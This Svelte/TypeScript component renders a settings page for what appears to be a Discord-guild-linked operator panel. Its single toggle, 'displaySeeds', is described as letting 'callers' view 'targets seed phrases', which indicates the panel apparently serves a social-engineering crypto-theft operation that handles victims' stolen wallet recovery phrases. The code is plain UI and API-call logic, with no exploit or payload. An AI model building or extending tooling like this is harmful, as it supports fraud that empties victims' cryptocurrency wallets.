<script lang="ts">
	import { onMount } from 'svelte';
	import { fade, slide } from 'svelte/transition';
	export let guild: string;

	interface Setting {
		name: string;
		value: boolean;
		description: string;
	}

	let settings: Setting[] = [];
	let loading = true;
	let error: string | null = null;
	let saveSuccess = false;

	async function fetchSettings() {
		try {
			const response = await fetch(`/api/guild/getSettings?guild=${guild}`);
			const data = await response.json();

			settings = [
				{
					name: 'displaySeeds',
					value: data.displaySeeds || false,
					description: 'Allow callers to view targets seed phrases'
				}
			];

			loading = false;
		} catch (err) {
			error = 'Failed to load settings';
			console.error(err);
			loading = false;
		}
	}

	async function updateSetting(setting: Setting) {
		try {
			const response = await fetch('/api/guild/updateSettings', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					guild,
					setting: setting.name,
					value: setting.value
				})
			});

			if (response.ok) {
				saveSuccess = true;
				setTimeout(() => (saveSuccess = false), 3000);
			} else {
				error = 'Failed to update setting';
			}
		} catch (err) {
			error = 'Error updating setting';
			console.error(err);
		}
	}

	onMount(fetchSettings);
</script>

<div class="settings-container">
	<div class="intro">
		<div class="header-content">
			<div class="title-section">
				<h1>Settings</h1>
				<p>Manage your panel settings</p>
			</div>
		</div>
	</div>

	{#if error}
		<div class="error-message" transition:slide>
			<span class="material-icons">error_outline</span>
			<p>{error}</p>
			<button class="close-error" on:click={() => (error = null)}>
				<span class="material-icons">close</span>
			</button>
		</div>
	{/if}

	{#if saveSuccess}
		<div class="success-message" transition:slide>
			<span class="material-icons">check_circle</span>
			<p>Settings saved successfully</p>
		</div>
	{/if}

	{#if loading}
		<div class="loading">
			<div class="loader"></div>
			<span>Loading settings...</span>
		</div>
	{:else}
		<div class="settings-grid" transition:fade>
			{#each settings as setting}
				<div class="setting-box">
					<div class="setting-content">
						<div class="setting-info">
							<h3>Display seeds for callers</h3>
							<p>{setting.description}</p>
						</div>
						<label class="toggle">
							<input
								type="checkbox"
								bind:checked={setting.value}
								on:change={() => updateSetting(setting)}
							/>
							<span class="slider"></span>
						</label>
					</div>
				</div>
			{/each}
		</div>
	{/if}
</div>

<style>
	.settings-container {
		padding: 2em;
	}

	.header-content {
		margin-bottom: 2em;
	}

	.title-section h1 {
		color: white;
		margin: 0;
	}

	.title-section p {
		color: #888;
		margin: 0.5em 0 0 0;
	}

	.settings-grid {
		display: grid;
		gap: 1em;
	}

	.setting-box {
		padding: 1.5em;
		background: rgb(56, 35, 155);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, #0e0d15 60%);
		border: 1px solid #0f131d;
		border-radius: 1em;
		transition: transform 0.2s;
	}

	.setting-box:hover {
		transform: translateY(-2px);
	}

	.setting-content {
		display: flex;
		justify-content: space-between;
		align-items: center;
		gap: 2em;
	}

	.setting-info h3 {
		color: white;
		margin: 0 0 0.5em 0;
		font-size: 1.1em;
	}

	.setting-info p {
		color: #888;
		margin: 0;
		font-size: 0.9em;
	}

	.toggle {
		position: relative;
		display: inline-block;
		width: 60px;
		height: 34px;
		flex-shrink: 0;
	}

	.toggle input {
		opacity: 0;
		width: 0;
		height: 0;
	}

	.slider {
		position: absolute;
		cursor: pointer;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		background-color: rgba(56, 35, 155, 0.2);
		transition: 0.4s;
		border-radius: 34px;
		border: 1px solid #0f131d;
	}

	.slider:before {
		position: absolute;
		content: '';
		height: 26px;
		width: 26px;
		left: 3px;
		bottom: 3px;
		background-color: white;
		transition: 0.4s;
		border-radius: 50%;
	}

	input:checked + .slider {
		background-color: #38239b;
	}

	input:checked + .slider:before {
		transform: translateX(26px);
	}

	.error-message {
		background: rgba(155, 35, 35, 0.2);
		color: #ff4444;
		padding: 1em;
		border-radius: 0.5em;
		margin-bottom: 1em;
		display: flex;
		align-items: center;
		gap: 1em;
	}

	.success-message {
		background: rgba(35, 155, 56, 0.2);
		color: #7ff78f;
		padding: 1em;
		border-radius: 0.5em;
		margin-bottom: 1em;
		display: flex;
		align-items: center;
		gap: 1em;
	}

	.close-error {
		background: none;
		border: none;
		color: #ff4444;
		cursor: pointer;
		padding: 0.5em;
		margin-left: auto;
	}

	.loading {
		text-align: center;
		padding: 4em;
		color: #888;
	}

	.loader {
		width: 40px;
		height: 40px;
		border: 3px solid rgba(56, 35, 155, 0.2);
		border-top-color: rgb(56, 35, 155);
		border-radius: 50%;
		animation: spin 1s linear infinite;
		margin: 0 auto 1em;
	}

	@keyframes spin {
		to {
			transform: rotate(360deg);
		}
	}
</style>
